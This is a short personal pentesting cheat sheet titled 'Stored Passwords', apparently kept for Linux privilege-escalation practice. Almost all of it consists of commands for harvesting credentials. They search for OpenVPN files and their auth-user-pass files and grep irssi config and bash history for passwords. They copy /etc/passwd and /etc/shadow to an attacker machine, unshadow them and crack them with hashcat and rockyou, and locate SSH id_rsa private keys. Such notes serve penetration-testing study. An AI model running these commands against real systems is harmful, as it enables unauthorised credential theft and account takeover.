---
title: Stored Passwords
updated: 2023-11-13 22:55:11Z
created: 2023-10-14 07:00:11Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

### OVPN files
1. Search for **.ovpn** files:
`find / -name *.ovpn`
2. cat any files found (eg **user.ovpn**)
`cat <name>.ovpn`
3. Take note if exist **auth-user-pass**
4. View contents of file at **auth-user-pass**

Some other config files

`cat /home/user/.irssi/config | grep -i passw`

### .bash_history
`cat ~/.bash_history | grep -i passw`

### shadow & password
1. copy /etc/passwd and /etc/shadow to haker machine
2. Unshadow to file:
`unshadow passwd.txt shadow.txt > unshadow.txt`
3. Crack dem hashes:
`hashcat -m 1800 unshadow.txt /usr/share/wordlists/rockyou.txt -O`

### SSH keys
1. `find / -name authorized_keys 2> /dev/null` (contains **public** key)
2. `find / -name id_rsa 2> /dev/null` (contains **private** key)


